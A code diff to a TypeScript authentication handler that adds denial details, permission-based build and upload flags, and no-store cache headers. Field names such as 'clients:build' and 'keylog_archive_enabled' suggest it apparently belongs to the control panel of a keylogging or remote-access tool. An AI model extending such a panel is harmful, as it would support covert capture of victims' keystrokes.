@@ -471,17 +471,33 @@ export async function handleAuthRoutes(
     }
 
     const reasons: string[] = [];
+    const denialDetails: Array<{
+      type: "feature" | "client";
+      message: string;
+      feature?: FeatureName;
+      clientId?: string;
+    }> = [];
 
     if (!canUserAccessFeature(user.userId, user.role, feature)) {
       reasons.push("feature");
+      denialDetails.push({
+        type: "feature",
+        feature,
+        message: `Feature access denied for ${feature}`,
+      });
     }
 
     if (clientId && !canUserAccessClient(user.userId, user.role, clientId)) {
       reasons.push("client");
+      denialDetails.push({
+        type: "client",
+        clientId,
+        message: `Client access denied for ${clientId}`,
+      });
     }
 
     if (reasons.length > 0) {
-      return Response.json({ allowed: false, denied: reasons });
+      return Response.json({ allowed: false, denied: reasons, denialDetails });
     }
 
     return Response.json({ allowed: true });
@@ -507,14 +523,18 @@ export async function handleAuthRoutes(
         userId: user.userId,
         mustChangePassword: dbUser ? Boolean(dbUser.must_change_password) : false,
         needsOnboarding: dbUser ? dbUser.onboarding_completed_at === null : false,
-        canBuild: dbUser ? Boolean(dbUser.can_build) : false,
+        canBuild: permissions.includes("clients:build"),
+        canUploadFiles: permissions.includes("files:upload"),
         telegramChatId: dbUser?.telegram_chat_id || "",
         inputArchiveEnabled: dbUser ? Boolean((dbUser as any).keylog_archive_enabled) : false,
         featurePermissions,
         permissions,
       }),
       {
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Cache-Control": "no-store, private",
+        },
       },
     );
   }
@@ -526,7 +546,21 @@ export async function handleAuthRoutes(
     }
 
     completeUserOnboarding(user.userId);
-    return Response.json({ ok: true, needsOnboarding: false });
+    const dbUser = getUserById(user.userId);
+    if (!dbUser || dbUser.onboarding_completed_at === null) {
+      return Response.json(
+        { error: "Could not save onboarding status" },
+        {
+          status: 500,
+          headers: { "Cache-Control": "no-store, private" },
+        },
+      );
+    }
+
+    return Response.json(
+      { ok: true, needsOnboarding: false },
+      { headers: { "Cache-Control": "no-store, private" } },
+    );
   }
 
   return null;
